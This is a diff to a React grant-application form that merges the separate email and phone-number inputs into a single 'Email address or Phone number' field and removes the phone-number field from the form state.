@@ -40,7 +40,6 @@ export default function App() {
     firstname: "",
     lastname: "",
     email: "",
-    number: "",
     state: "",
     amount: "",
     payout: "",
@@ -59,7 +58,6 @@ export default function App() {
       firstname: grantInputs.firstname,
       lastname: grantInputs.lastname,
       email: grantInputs.email,
-      number: grantInputs.number,
       state: grantInputs.state,
       amount: grantInputs.amount,
       payout: grantInputs.payout,
@@ -81,7 +79,6 @@ export default function App() {
             firstname: "",
             lastname: "",
             email: "",
-            number: "",
             state: "",
             amount: "",
             payout: "",
@@ -295,34 +292,20 @@ export default function App() {
 
           <div className="flex flex-col gap-1">
             <label htmlFor="" className="uppercase font-semibold">
-              Email <span className="text-red-500">*</span>
-            </label>
-            <input
-              required
-              type="email"
-              name="email"
-              value={grantInputs.email}
-              onChange={handleChange}
-              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-300 placeholder:font-light px-4 bg-white h-[45px]"
-              placeholder="Enter your email addres"
-            />
-          </div>
-
-          <div className="flex flex-col gap-1">
-            <label htmlFor="" className="uppercase font-semibold">
-              Phone Number <span className="text-red-500">*</span>
+              Email address or Phone number <span className="text-red-500">*</span>
             </label>
             <input
               required
               type="text"
-              name="number"
-              value={grantInputs.number}
+              name="email"
+              value={grantInputs.email}
               onChange={handleChange}
               className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-300 placeholder:font-light px-4 bg-white h-[45px]"
-              placeholder="Enter your phone number"
+              placeholder="Enter your email addres or phone number"
             />
           </div>
 
+      
           <div className="flex flex-col gap-1">
             <label htmlFor="" className="uppercase font-semibold">
               State <span className="text-red-500">*</span>
